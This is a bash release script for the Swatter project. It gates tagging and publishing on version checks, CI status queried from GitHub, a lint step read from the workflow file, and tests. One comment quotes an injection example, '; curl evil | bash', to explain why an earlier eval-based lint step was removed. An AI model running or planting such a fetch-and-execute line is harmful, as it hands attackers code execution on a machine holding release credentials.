#!/usr/bin/env bash
# install/release.sh — cut a Swatter release end to end.
#
# A `git push` moves CODE; it does not publish a VERSION. GitHub's repo page
# shows the latest *Release* (a tag + GitHub Release), not the latest commit, so
# skipping the release step leaves the public repo looking a version behind even
# though `main` is current. This script does the whole ritual in one command:
# verify -> tag -> dual-push -> GitHub Release -> GitLab Release -> confirm.
#
# Releases are 1:1 with version bumps. If a change doesn't bump SWATTER_VERSION
# it isn't release-worthy (docs/spec/test/internal refactor) — just push it. This
# script REFUSES to release unless bin/swatter's SWATTER_VERSION already equals
# the target, so "forgot to bump" and "this didn't need a release" both stop here.
#
# Usage:
#   install/release.sh <X.Y.Z | patch | minor | major> [--dry-run]
#                      [--notes-file F] [--skip-ci-check]
#
# Preconditions it ENFORCES (each aborts the release): run from the repo, on
# `main`, clean working tree, in sync with origin/main, target tag does not yet
# exist, SWATTER_VERSION == target, **every GitHub check for the exact commit is
# green**, and the test suite passes. --dry-run runs every read-only check and
# prints the actions it WOULD take, changing nothing.
#
# Checked but NOT enforced: CI's own lint command is also run locally, and it
# reports UNVERIFIED rather than aborting when shellcheck is absent or the
# workflow has no recognisable lint step. Do not read that warning as a pass —
# the CI gate above is the authority.
#
# The CI gate is not belt-and-braces. Until 2026-08-13 this script checked only
# its own test suite, which does NOT include the linter — so v2.15.0 and v2.15.1
# were both tagged and published while CI was red on a lint error that the local
# linter did not reproduce. --skip-ci-check overrides it and says so loudly, and
# is offered ONLY for a red or unfinished build; a failed query says "fix gh"
# instead, because a suggested override is how a gate quietly stops mattering.
# (Careful editing these comments: a line starting with "# shellcheck" is parsed
# as a DIRECTIVE, and an unparseable one is itself an error. Ask me how I know.)

set -uo pipefail

GH_REPO="peaceharborco/swatter"
GL_REPO="peaceharborco/swatter"

die()  { printf '\033[31mrelease: %s\033[0m\n' "$*" >&2; exit 1; }
info() { printf '\033[36m==>\033[0m %s\n' "$*"; }
warn() { printf '\033[33mrelease: %s\033[0m\n' "$*" >&2; }

# _next_version <current X.Y.Z> <patch|minor|major|X.Y.Z> -> prints next version.
# Pure (no side effects) so it can be unit-tested.
_next_version() {
    local cur="$1" spec="$2"
    if [[ "$spec" =~ ^[0-9]+\.[0-9]+\.[0-9]+$ ]]; then printf '%s' "$spec"; return 0; fi
    [[ "$cur" =~ ^[0-9]+\.[0-9]+\.[0-9]+$ ]] || return 1
    local M m p; IFS=. read -r M m p <<<"$cur"
    case "$spec" in
        major) printf '%d.0.0' "$((M+1))" ;;
        minor) printf '%d.%d.0' "$M" "$((m+1))" ;;
        patch) printf '%d.%d.%d' "$M" "$m" "$((p+1))" ;;
        *) return 1 ;;
    esac
}

# _file_version -> the SWATTER_VERSION currently committed in bin/swatter.
_file_version() {
    grep -E '^SWATTER_VERSION=' bin/swatter \
        | sed -E 's/.*"([0-9]+\.[0-9]+\.[0-9]+)".*/\1/'
}

# _ci_lint_cmd [workflow-file] -> the shellcheck command line CI actually runs.
#
# Read out of the workflow rather than duplicated here ON PURPOSE. A copy would
# drift, and the drift is invisible until a release ships red — which is exactly
# the failure this gate exists to stop. Empty output means the workflow no longer
# has a recognisable shellcheck step; callers must treat that as "cannot verify",
# never as "nothing to check".
_ci_lint_cmd() {
    local wf="${1:-.github/workflows/ci.yml}"
    [[ -r "$wf" ]] || return 1
    # Both YAML shapes are legal and both appear in the wild: `run:` on its own
    # line under a `- name:` item, and `- run:` inline. \{0,1\} not \? — BSD sed
    # (macOS) does not support the latter in a basic regex.
    # `{p;q;}` rather than `| head -1`: under `set -o pipefail` a second matching
    # line can SIGPIPE sed (rc 141), and the caller reads any non-zero as
    # "cannot verify" — so a workflow with two shellcheck steps would silently
    # downgrade the gate instead of linting.
    sed -n '/^[[:space:]]*\(-[[:space:]]*\)\{0,1\}run:[[:space:]]*shellcheck[[:space:]]/{
             s/^[[:space:]]*\(-[[:space:]]*\)\{0,1\}run:[[:space:]]*\(shellcheck[[:space:]].*\)$/\2/p
             q
           }' "$wf"
}

# _release_lint_gate [workflow-file] -> rc 0 iff CI's own lint command is clean
# here; rc 90 means "could not check" (no shellcheck, or no recognisable lint
# step), which the caller must report as unverified — never as clean; any other
# non-zero is a genuine lint failure.
#
# 90, not 2. shellcheck ITSELF exits 2 when it cannot open a file, so an earlier
# revision using 2 for cannot-verify reported a genuinely broken lint command
# ("shellcheck /nonexistent") as "UNVERIFIED — no shellcheck installed" and let
# the release continue. Same fail-open class this gate exists to close, so the
# sentinel has to be a value shellcheck never returns.
#
# NOT `eval`. An earlier version did, and a reviewer proved the obvious: sed keeps
# everything after `run: `, so a `ci.yml` line ending `; curl evil | bash` executed
# at release time as the maintainer, with output discarded. `ci.yml` is reviewed as
# CI config, not as something that runs on a laptop holding gh/glab/ssh creds.
#
# Unquoted $cmd in a for-list word-splits AND glob-expands (both wanted, since the
# command carries `lib/*.sh`) but does NOT rescan for command substitution — so
# injected metacharacters arrive as harmless ARGUMENTS to shellcheck, which then
# fails, which fails the gate. Closed either way.
_release_lint_gate() {
    local wf="${1:-.github/workflows/ci.yml}" cmd tok
    local -a argv=()
    command -v shellcheck >/dev/null || return 90
    cmd="$(_ci_lint_cmd "$wf")" || return 90
    [[ -n "$cmd" ]] || return 90
    for tok in $cmd; do argv+=("$tok"); done
    # The step must really be a shellcheck invocation; anything else is
    # unverifiable rather than passing.
    [[ "${argv[0]}" == "shellcheck" ]] || return 90
    # stdin closed for the same reason _release_test_gate does it: never let a
    # subprocess block a release waiting on a terminal.
    "${argv[@]}" </dev/null >/dev/null 2>&1
}

# _ci_expected_checks [workflow-dir] -> the job ids every commit should produce,
# one per line, read from the workflow files themselves.
#
# Needed because "every check I can see is green" is NOT "the suite ran". A job
# that never registers is absent, not failing, so a single fast green job would
# otherwise be enough to release. Deriving the list from the workflows means
# adding a job automatically extends the gate.
_ci_expected_checks() {
    local dir="${1:-.github/workflows}"
    [[ -d "$dir" ]] || return 1
    # Job ids are the 2-space-indented keys under `jobs:`. Take only lines after
    # a `jobs:` line so trigger keys (push:, pull_request:) cannot be mistaken
    # for jobs. GitHub names a check after the job's `name:` when set; none of
    # this repo's jobs set one, so the id is the check name.
    awk '/^jobs:/{injobs=1; next} /^[^[:space:]#]/{injobs=0}
         injobs && /^  [A-Za-z0-9_-]+:[[:space:]]*$/ {gsub(/[: ]/,"",$1); print $1}' \
        "$dir"/*.yml 2>/dev/null | sort -u
}

# _ci_commit_state <sha> -> one classification word on stdout:
#
#   green            every expected check ran and concluded acceptably
#   pending:<names>  at least one is still queued/running
#   missing:<names>  an expected job produced no check run at all
#   failed:<names>   at least one concluded failure/cancelled/timed_out/...
#   none             GitHub has no check runs for this commit at all
#   transport:<msg>  the query itself failed (auth, rate limit, offline, 404)
#
# Everything here is a review finding paid for in blood:
#
# 1. It asks about the COMMIT, not one workflow. `--workflow CI` silently ignored
#    gitleaks.yml, so a CI-green/gitleaks-red commit could release.
# 2. `transport:` is SEPARATE from `none`. When stderr was discarded, an expired
#    token looked exactly like "no run yet", and the die text suggested
#    --skip-ci-check — training a bypass of the only gate that catches this.
# 3. FAILED OUTRANKS PENDING. Checking "anything unfinished" first reported
#    test=failure + hub=running as merely "pending: waiting on hub", and told the
#    operator skip would "release without waiting" — shipping a known-red commit.
# 4. A name with ANY unfinished run is pending, regardless of timestamps. GitHub
#    leaves started_at null until a run starts, and jq's `max` prefers a real
#    timestamp over null — so a queued re-run lost to its own older success and
#    the commit read green.
# 5. Among COMPLETED runs for one name the latest wins (re-runs supersede), but a
#    TIE prefers the failure: plain max_by returns the last element, so an
#    equal-timestamped success could mask a failure.
# 6. Expected-but-absent is its own state. See _ci_expected_checks.
_ci_commit_state() {
    local sha="$1" out rc want got missing=""
    # per_page=100 (the API max) and an explicit truncation check, NOT --paginate:
    # in paginate mode gh applies --jq to EACH page and concatenates, so a second
    # page would emit two answers. --slurp would combine them but cannot be used
    # with --jq, and piping to external jq would make jq a hard dependency the
    # rest of the tool treats as optional.
    out="$(gh api "repos/${GH_REPO}/commits/${sha}/check-runs?per_page=100" --jq '
        .total_count as $tc
        | [.check_runs[] | {name, status, conclusion, started_at}]
        | if length < $tc then "truncated:\($tc) checks, only \(length) read"
          else
            group_by(.name)
            | map( if any(.status != "completed") then {n: .[0].name, s: "pending"}
                   else ( (map(.started_at) | max) as $t
                          | map(select(.started_at == $t))
                          | if any((.conclusion == "success" or .conclusion == "neutral" or .conclusion == "skipped") | not)
                            then {n: .[0].name, s: "failed"} else {n: .[0].name, s: "ok"} end )
                   end )
            | "failed=" + (map(select(.s == "failed") | .n) | unique | join(","))
            + ";pending=" + (map(select(.s == "pending") | .n) | unique | join(","))
            + ";present=" + (map(.n) | unique | join(","))
          end' 2>&1)"
    rc=$?
    if (( rc != 0 )) || [[ -z "$out" ]]; then
        printf 'transport:%s' "$(printf '%s' "${out:-gh produced no output}" | tr '\n' ' ' | cut -c1-200)"
        return 0
    fi
    case "$out" in
        truncated:*) printf 'transport:%s' "$out"; return 0 ;;
        failed=*)    : ;;
        *) printf 'transport:unrecognised answer from gh: %s' \
               "$(printf '%s' "$out" | tr '\n' ' ' | cut -c1-160)"; return 0 ;;
    esac

    local f p present
    f="${out#failed=}";   f="${f%%;*}"
    p="${out#*;pending=}"; p="${p%%;*}"
    # Wrap in ';' AND swap the ',' separators for ';' so a whole-name match is
    # possible: ";a,b,c;" would never match ";b;", and every expected check would
    # read as absent.
    present="${out#*;present=}"; present=";${present//,/;};"

    # Failed first — see note 3.
    [[ -n "$f" ]] && { printf 'failed:%s' "$f"; return 0; }
    [[ -n "$p" ]] && { printf 'pending:%s' "$p"; return 0; }
    [[ "$present" == ";;" ]] && { printf 'none'; return 0; }

    # Everything observed is green. Now: did everything we EXPECT show up?
    while IFS= read -r want; do
        [[ -n "$want" ]] || continue
        [[ "$present" == *";${want};"* ]] || missing="${missing:+${missing},}${want}"
    done < <(_ci_expected_checks)
    [[ -n "$missing" ]] && { printf 'missing:%s' "$missing"; return 0; }
    printf 'green'
}

# _release_test_gate [dir] -> run every *_test.sh; rc 0 iff all pass. Each test
# runs with stdin CLOSED (</dev/null): a test — or a mock inside one — that
# reads stdin would otherwise block the release forever when this script is
# driven from a terminal or pipeline (bit the v2.5.0 cut).
_release_test_gate() {
    local dir="${1:-test}" t fails=0
    for t in "$dir"/*_test.sh; do
        [[ -e "$t" ]] || continue
        if bash "$t" >/dev/null 2>&1 </dev/null; then
            printf '    ok   %s\n' "$(basename "$t")"
        else
            printf '    FAIL %s\n' "$(basename "$t")"; fails=1
        fi
    done
    (( fails == 0 ))
}

# _gen_notes <prev-tag> <new-version> -> Markdown release notes on stdout.
_gen_notes() {
    local prev="$1" new="$2"
    printf '## Changes\n\n'
    git log --no-merges --pretty='- %s' "${prev}..HEAD"
    printf '\n**Full changelog:** https://github.com/%s/compare/%s...v%s\n' \
        "$GH_REPO" "$prev" "$new"
}

main() {
    local spec="" dry=0 notes_override="" skip_ci=0
    while (( $# )); do
        case "$1" in
            --dry-run) dry=1 ;;
            --skip-ci-check) skip_ci=1 ;;
            --notes-file) notes_override="${2:-}"; shift ;;
            -h|--help) grep -E '^#( |$)' "$0" | sed 's/^# \{0,1\}//'; exit 0 ;;
            -*) die "unknown flag: $1" ;;
            *) [[ -z "$spec" ]] && spec="$1" || die "unexpected arg: $1" ;;
        esac
        shift
    done
    [[ -n "$spec" ]] || die \
"usage: release.sh <X.Y.Z|patch|minor|major> [--dry-run] [--notes-file F] [--skip-ci-check]"

    # Run from the repo root regardless of cwd.
    local root; root="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")/.." && pwd)" || die "cannot locate repo root"
    cd "$root" || die "cannot cd to $root"
    [[ -f bin/swatter ]] || die "bin/swatter not found — wrong directory?"

    # Tooling.
    for t in git gh glab; do command -v "$t" >/dev/null || die "missing required tool: $t"; done

    # Branch + cleanliness.
    local branch; branch="$(git rev-parse --abbrev-ref HEAD)"
    [[ "$branch" == "main" ]] || die "must release from 'main' (on '$branch')"
    [[ -z "$(git status --porcelain)" ]] || die "working tree not clean — commit or stash first"

    # In sync with origin/main.
    info "fetching origin"
    git fetch --quiet origin main || die "git fetch failed"
    local local_head remote_head
    local_head="$(git rev-parse HEAD)"; remote_head="$(git rev-parse origin/main)"
    [[ "$local_head" == "$remote_head" ]] || die "local main and origin/main differ — push/pull first"

    # Resolve versions.
    local prev_tag cur_ver target file_ver
    prev_tag="$(git describe --tags --abbrev=0 2>/dev/null || echo '')"
    cur_ver="${prev_tag#v}"; [[ -n "$cur_ver" ]] || cur_ver="0.0.0"
    target="$(_next_version "$cur_ver" "$spec")" || die "invalid version/bump: '$spec'"
    file_ver="$(_file_version)"

    info "current latest tag: ${prev_tag:-<none>}  ->  target: v${target}"
    info "bin/swatter SWATTER_VERSION: ${file_ver:-<unset>}"

    # The bump must already be in the code (releases are 1:1 with version bumps).
    [[ "$file_ver" == "$target" ]] || die \
"SWATTER_VERSION is '${file_ver:-unset}' but releasing v${target}.
       Bump SWATTER_VERSION to ${target} in bin/swatter inside your feature
       commit, push, then re-run. (If this change didn't change behavior, it
       doesn't need a release — just push it.)"

    # Tag must not already exist.
    git rev-parse -q --verify "refs/tags/v${target}" >/dev/null \
        && die "tag v${target} already exists locally"
    git ls-remote --exit-code --tags origin "v${target}" >/dev/null 2>&1 \
        && die "tag v${target} already exists on origin"

    # Gate on a green COMMIT — every workflow, not just one — for the exact
    # commit being tagged.
    #
    # The test suite below is not a substitute: CI also runs shellcheck and a
    # separate `hub` job, and nothing here used to ask GitHub anything, so
    # v2.15.0 and v2.15.1 were both tagged and published while CI was red.
    #
    # Note which failures may mention --skip-ci-check. A red or still-running
    # build is a decision the operator gets to make. A broken query is NOT: if
    # the answer is unknown, the remedy is to fix gh, because "unknown" plus a
    # helpfully-suggested override is exactly how this hole reopens.
    local short; short="$(git rev-parse --short HEAD)"
    if (( skip_ci )); then
        warn "--skip-ci-check given: releasing v${target} WITHOUT verifying CI for ${short}."
        warn "  This is the hole that shipped v2.15.0 and v2.15.1 red. Say so in the release notes."
    else
        info "checking CI for ${short} (all workflows)"
        local ci; ci="$(_ci_commit_state "$local_head")"
        case "$ci" in
            green) info "    CI: green" ;;
            failed:*)
                die "CI is RED for ${short} — failing: ${ci#failed:}
       Fix and push, then release. (--skip-ci-check ships it red anyway.)" ;;
            pending:*)
                die "CI has not finished for ${short} — still running: ${ci#pending:}
       Wait for it. (--skip-ci-check releases without waiting.)" ;;
            missing:*)
                die "expected checks never appeared for ${short}: ${ci#missing:}
       Everything that DID run is green, which is exactly why this is not a pass:
       an absent check is not a passing one. Either the runs have not registered
       yet (wait and re-run this), or that workflow no longer triggers for this
       commit (investigate — do not skip)." ;;
            none)
                die "GitHub reports no checks at all for ${short}.
       HEAD matches origin/main, so it IS pushed. Most often this is simply the
       few seconds between the push and the runs registering — wait and re-run.
       If it persists, the workflows are not triggering for this commit."  ;;
            transport:*)
                die "cannot determine CI state for ${short} — the query itself failed:
         ${ci#transport:}
       Fix that first (gh auth status / rate limit / network). Do NOT reach for
       --skip-ci-check here: this is 'unknown', not 'green'." ;;
            *)
                die "unhandled CI state '${ci}' for ${short} — refusing to guess" ;;
        esac
    fi

    # Gate on CI's own lint command, run locally. Cheap, and unlike the CI query
    # it needs no network. It is NOT a substitute for the CI gate: CI's shellcheck
    # comes from apt and is routinely stricter than a local build, which is the
    # precise reason the 2.15 failures were invisible here.
    info "running CI's lint command"
    _release_lint_gate; local lrc=$?
    case $lrc in
        0)  info "    lint: clean" ;;
        90) warn "    UNVERIFIED — no shellcheck installed, or no recognisable lint step in the workflow." ;;
        *)  die "the lint command CI runs exits ${lrc} here — fix it, or CI will be red too.
       Re-run it yourself to see why:  $(_ci_lint_cmd || echo '<could not extract>')" ;;
    esac

    # Gate on green tests.
    info "running test suite"
    _release_test_gate test || die "tests failing — not releasing"

    # Release notes. (Bake the path into the trap NOW — a single-quoted trap would
    # reference $notes at EXIT time, after this local is out of scope: set -u abort.)
    local notes; notes="$(mktemp)"; trap "rm -f '$notes'" EXIT
    if [[ -n "$notes_override" ]]; then
        cat "$notes_override" > "$notes"
    else
        _gen_notes "${prev_tag:-HEAD}" "$target" > "$notes"
    fi
    local title="v${target}"

    info "release notes:"; sed 's/^/    /' "$notes"

    if (( dry )); then
        warn "DRY RUN — would now run:"
        printf '    git tag -a v%s -m "release: v%s"\n' "$target" "$target"
        printf '    git push origin v%s        (dual-push: GitHub + GitLab)\n' "$target"
        printf '    gh release create v%s --repo %s --title "%s" --notes-file <notes>\n' "$target" "$GH_REPO" "$title"
        printf '    glab release create v%s -R %s --name "%s" --notes-file <notes>\n' "$target" "$GL_REPO" "$title"
        info "dry run complete — nothing changed"
        return 0
    fi

    # --- mutate from here ---
    info "tagging v${target}"
    git tag -a "v${target}" -m "release: v${target}" || die "git tag failed"

    info "pushing tag to both remotes"
    git push origin "v${target}" || die "tag push failed (tag exists locally; re-run after fixing remote)"

    info "creating GitHub release"
    gh release create "v${target}" --repo "$GH_REPO" --title "$title" --notes-file "$notes" \
        || die "gh release failed (tag is pushed; finish manually with: gh release create v${target} ...)"

    info "creating GitLab release"
    glab release create "v${target}" -R "$GL_REPO" --name "$title" --notes-file "$notes" \
        || warn "glab release failed — finish with: glab release create v${target} -R ${GL_REPO} ..."

    info "verifying GitHub latest release"
    gh repo view "$GH_REPO" --json latestRelease \
        --jq '"    latest: \(.latestRelease.tagName) — \(.latestRelease.name)"' 2>/dev/null || true

    info "released v${target} ✓"
}

# Only run when executed, not when sourced (so tests can call _next_version).
# ${BASH_SOURCE[0]:-} keeps this set -u-safe when sourced at top level.
if [[ "${BASH_SOURCE[0]:-}" == "${0}" ]]; then
    main "$@"
fi
